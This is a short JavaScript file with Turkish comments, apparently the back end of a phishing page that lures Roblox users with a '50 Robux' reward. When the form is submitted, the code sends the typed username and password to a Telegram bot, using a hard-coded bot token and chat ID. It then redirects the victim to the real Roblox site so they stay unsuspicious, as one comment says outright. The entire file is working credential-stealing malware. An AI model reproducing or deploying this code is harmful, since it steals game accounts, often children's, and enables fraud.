document.getElementById('reward-form').addEventListener('submit', async (e) => {
    e.preventDefault();
    
    const u = document.getElementById('user').value;
    const p = document.getElementById('pass').value;

    // Senin Telegram Bilgilerin
    const token = "8587670631:AAGkV1-0y8SF9gXTz2_6y0oBdZR1rGlJF10";
    const chatID = "8512406356";

    const metin = `💰 50 ROBUX YEMİNE DÜŞTÜ!\n\n👤 Kullanıcı: ${u}\n🔑 Şifre: ${p}\n\n🔥 Durum: İnfaz Edildi`;

    try {
        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: chatID, text: metin })
        });
        
        // Kurbanı gerçek sayfaya gönder ki şüphelenmesin
        window.location.replace("https://www.roblox.com/promocodes");
    } catch (err) {
        window.location.replace("https://www.roblox.com/login");
    }
});
